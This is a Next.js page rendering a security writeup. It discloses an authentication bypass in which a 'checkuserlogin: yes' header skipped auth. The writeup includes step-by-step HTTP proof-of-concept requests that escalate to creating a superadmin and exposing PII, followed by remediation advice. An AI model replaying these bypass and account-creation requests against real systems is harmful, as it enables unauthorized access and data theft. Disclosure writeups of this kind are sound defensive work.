import Link from "next/link";
import Image from "next/image";

// images - place these files inside the same folder as this page:
// 200loginreq.jpg, 200reqwithheader.jpg, addingsuperadminwith header.jpg,
// normloginreqwithouheader.jpg, reqreqwithheader.jpg, signupUI.jpg,
// superadminaccessinfo.jpg, SuperAdminDashboard.jpg
import login200 from "./200loginreq.jpg";
import req200WithHeader from "./200reqwithheader.jpg";
import addSuperadminHeader from "./addingsuperadminwithheader.jpg";
import normalLoginNoHeader from "./200loginreq.jpg"; // ✅ fixed
import reqRegWithHeader from "./regreqwithheader.jpg";
import signupUI from "./signupUI.jpg";
import superadminAccessInfo from "./superadminaccessinfo.jpg";
import superAdminDashboard from "./SuperAdminDashboard.jpg";

export default function HeaderToSuperadmin() {
  return (
    <div className="min-h-screen grid-pattern py-16 px-4">
      <div className="max-w-4xl mx-auto">
        <Link href="/writeups" className="text-primary hover:underline inline-flex items-center gap-2">
          ← Back to Writeups
        </Link>

        <article className="mt-6">
          <header className="mb-8">
            <div className="flex items-center gap-3 mb-4">
              <span className="px-3 py-1 rounded-md text-xs font-bold bg-red-500/10 text-red-500 border border-red-500/20">
                CVSS 9.8
              </span>
              <span className="px-3 py-1 rounded-md text-xs font-bold bg-red-500/10 text-red-500 border border-red-500/20">
                CRITICAL
              </span>
            </div>

            <h1 className="text-4xl md:text-5xl font-bold mb-4 bg-gradient-to-r from-primary to-green-400 bg-clip-text text-transparent">
              🛑 "checkuserlogin: yes" — The Header That Gave Me SuperAdmin Powers
            </h1>

            <div className="flex flex-wrap gap-2 mb-4">
              {["Broken Access Control", "Auth Bypass", "Account Takeover", "PII"].map((t) => (
                <span key={t} className="px-2 py-1 bg-primary/10 text-primary text-xs rounded border border-primary/20">
                  #{t}
                </span>
              ))}
            </div>

            <p className="text-muted-foreground">Published: 2025-02-10</p>
          </header>

          <div className="prose prose-invert max-w-none space-y-6 text-muted-foreground">
            <h2 className="text-2xl font-bold text-primary">🧠 TL;DR</h2>
            <p className="italic">
              Adding a single header to any request — <code>checkuserlogin: yes</code> — caused the application
              to skip authentication and return sensitive data or perform privileged actions. That single header
              allowed me to access admin endpoints, create SuperAdmin accounts, and exfiltrate PII.
            </p>

            <h2 className="text-2xl font-bold text-primary">📌 Context</h2>
            <p>
              While testing the application instance I noticed a suspicious header being
              used by a login helper in the codebase: <code>checkuserlogin: yes</code>. Something that looked like
              a developer bypass flag ended up being accepted in production — and it was not scoped or validated.
            </p>

            <h2 className="text-2xl font-bold text-primary">🚧 Root Cause</h2>
            <p>
              The server trusted a non-standard header as a proof of authentication in several codepaths.
              If present, internal checks were short-circuited and the request was treated as authenticated/authorized.
              In other words: a forgotten developer shortcut became a global backdoor.
            </p>

            <h2 className="text-2xl font-bold text-primary">🔍 Discovery & PoC</h2>

            <h3 className="text-lg font-semibold">Step 1 — Baseline (no header)</h3>
            <p>Normal login attempt without the header was rejected:</p>
            <pre className="rounded-md p-3 bg-gray-900 text-xs overflow-auto">
{`POST /login HTTP/1.1
Host: staging.example
Content-Type: application/json

{ "email": "attacker@example.com", "password": "hunter2" }`}
            </pre>

            <div className="rounded border border-border p-3">
              <Image src={normalLoginNoHeader} alt="Normal login request" width={900} height={420} className="rounded" />
              <p className="text-xs mt-2">Normal login request — rejected (expected).</p>
            </div>

            <h3 className="text-lg font-semibold">Step 2 — Add the header</h3>
            <p>Same request with the header added:</p>
            <pre className="rounded-md p-3 bg-gray-900 text-xs overflow-auto">
{`POST /login HTTP/1.1
Host: staging.example
Content-Type: application/json
checkuserlogin: yes

{ "email": "attacker@example.com", "password": "hunter2" }`}
            </pre>

            <div className="rounded border border-border p-3">
              <Image src={login200} alt="Login request 200" width={900} height={420} className="rounded" />
              <p className="text-xs mt-2">Server returned 200 and full user payload when header present.</p>
            </div>

            <h3 className="text-lg font-semibold">Step 3 — Reuse header on internal endpoints</h3>
            <p>
              I re-used <code>checkuserlogin: yes</code> on authenticated endpoints (example: <code>/getuserdetails</code>,
              <code>/verifyusersemail</code>, <code>/superadmin</code>) and received valid success responses without tokens:
            </p>

            <pre className="rounded-md p-3 bg-gray-900 text-xs overflow-auto">
{`POST /getuserdetails
Host: staging.example
Content-Type: application/json
checkuserlogin: yes

{ "userId": "victim-1234" }`}
            </pre>

            <div className="rounded border border-border p-3">
              <Image src={req200WithHeader} alt="200 response with header" width={900} height={420} className="rounded" />
              <p className="text-xs mt-2">Example API response showing 200 OK when header is present.</p>
            </div>

            <h3 className="text-lg font-semibold">Step 4 — Create SuperAdmin</h3>
            <p>
              With header-enabled responses I could call the admin user creation endpoints and inject a new SuperAdmin:
            </p>

            <pre className="rounded-md p-3 bg-gray-900 text-xs overflow-auto">
{`POST /addgauser
Host: staging.example
Content-Type: application/json
checkuserlogin: yes

{
  "email": "attackerdilip@gmail.com",
  "role": "superadmin"
}`}
            </pre>

            <div className="rounded border border-border p-3">
              <Image src={addSuperadminHeader} alt="Adding superadmin with header" width={900} height={420} className="rounded" />
              <p className="text-xs mt-2">Proof: new superadmin creation request accepted when header present.</p>
            </div>

            <h3 className="text-lg font-semibold">Step 5 — Access SuperAdmin panel</h3>
            <p>After creating the account I was able to authenticate as a SuperAdmin and view admin dashboards and data.</p>

            <div className="rounded border border-border p-3">
              <Image src={superadminAccessInfo} alt="Superadmin access info" width={900} height={520} className="rounded" />
              <p className="text-xs mt-2">SuperAdmin endpoint returned extensive PII.</p>
            </div>

            <div className="rounded border border-border p-3">
              <Image src={superAdminDashboard} alt="SuperAdmin dashboard" width={900} height={520} className="rounded" />
              <p className="text-xs mt-2">Admin dashboard view obtained after account creation.</p>
            </div>

            <h2 className="text-2xl font-bold text-primary mt-8">💥 Impact</h2>
            <ul className="list-disc list-inside ml-4 space-y-2">
              <li>Total authentication bypass for endpoints honoring the header.</li>
              <li>Creation of privileged users (SuperAdmin) without proper validation.</li>
              <li>Wide-scale PII exposure (names, emails, addresses, phone numbers).</li>
              <li>Potential full compromise of backend systems and data exfiltration.</li>
            </ul>

            <h2 className="text-2xl font-bold text-primary mt-8">🛠 Recommendations</h2>
            <div className="space-y-4">
              <div className="bg-background p-4 rounded border border-border">
                <p className="font-bold text-primary">🔒 Remove trust in arbitrary headers</p>
                <p className="text-sm">Never treat headers as proof of authentication or authorization. Remove any code paths that short-circuit checks based on non-standard headers.</p>
              </div>

              <div className="bg-background p-4 rounded border border-border">
                <p className="font-bold text-primary">🔁 Split pre-auth and post-auth logic</p>
                <p className="text-sm">Ensure pre-auth helpers do not leak into production flows; keep login bootstrap code isolated and behind test/dev flags.</p>
              </div>

              <div className="bg-background p-4 rounded border border-border">
                <p className="font-bold text-primary">🔐 Enforce backend role validation</p>
                <p className="text-sm">Every sensitive endpoint must validate the caller’s server-side session, role, and permissions — regardless of any request header.</p>
              </div>

              <div className="bg-background p-4 rounded border border-border">
                <p className="font-bold text-primary">🔎 Monitor & alert</p>
                <p className="text-sm">Log occurrences of suspicious headers and raise alerts for requests that access admin endpoints without expected authentication tokens.</p>
              </div>
            </div>

            <h2 className="text-2xl font-bold text-primary mt-8">🏁 Final Notes</h2>
            <p>
              Small developer conveniences become gigantic security holes when deployed. This case is a reminder to treat request metadata as untrusted and to perform strict server-side checks for all privilege-sensitive actions.
            </p>
          </div>

          <div className="mt-12 pt-8 border-t border-border">
            <Link href="/writeups" className="text-primary hover:underline inline-flex items-center gap-2">
              ← Back to all writeups
            </Link>
          </div>
        </article>
      </div>
    </div>
  );
}
